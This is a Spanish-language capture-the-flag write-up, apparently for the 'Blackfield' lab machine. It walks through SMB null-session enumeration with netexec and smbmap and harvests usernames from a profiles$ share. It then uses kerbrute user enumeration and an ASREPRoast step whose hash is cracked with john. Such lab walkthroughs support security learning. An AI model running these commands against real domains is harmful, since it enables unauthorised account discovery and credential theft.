...
Vamos a enumerar el puerto smb con crackmapexec para sacar alguna información relevante

```bash
netexec smb <IP>
```
Vemos que conseguimos un dominio llamado blackfield.local que vamos a añadir al archivo /etc/hosts y la version de windows siendo un windows server 2019.

![netexec](images/03_ntx.png)

Con smbmap vamos a ver los recursos compartidos de ese protocolo, para ello emplearemos un null session poniendo en el nombre de usuario uno cualquiera.

```bash
$ smbmap -H 10.129.229.17 -u 'test'
[+] Guest session   	IP: 10.129.229.17:445	Name: 10.129.229.17                                     
...
```
Tenemos capacidad de lectura en el directorio profiles, eso quiere decir que podemos listar algunos usuarios que puedan usar este protocolo.

```bash
smbmap -H 10.129.229.17 -u 'test' -r 'profiles$'
[+] Guest session   	IP: 10.129.229.17:445	Name: 10.129.229.17                                     
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	profiles$                                         	READ ONLY	
	...
	dr--r--r--                0 Wed Jun  3 18:47:11 2020	AChampken
...
....
```
Conseguimos ese listado, ahora vamos a filtrarlo y añadirlo a un archivo para tenerlo guardado.

```bash
smbmap -H 10.129.229.17 -u 'test' -r 'profiles$' | awk 'NF{print $NF}' > lista_usuarios
```
Ahora tenemos que entrar al archivo y eliminar las primeras lineas que no nos sirven

![lista](images/05_lista_usuarios.png)

# 🦮 Enumeración kerberos
Ya que tenemos la lista, vamos a enumerar que usuarios son validos del dominio.
Para ello usaremos la herramienta kerbrute.

```bash
kerbrute --dc 10.129.229.17 -d blackfield.local userenum lista_usuarios
```
Este programa tambien hace un ataque ASREPROAST que nos sirve para conseguir el TGT hasheado.

![kerbrute](images/06_kerbrute.png)

Lo metemos en un archivo llamado hash y con john lo crackeamos
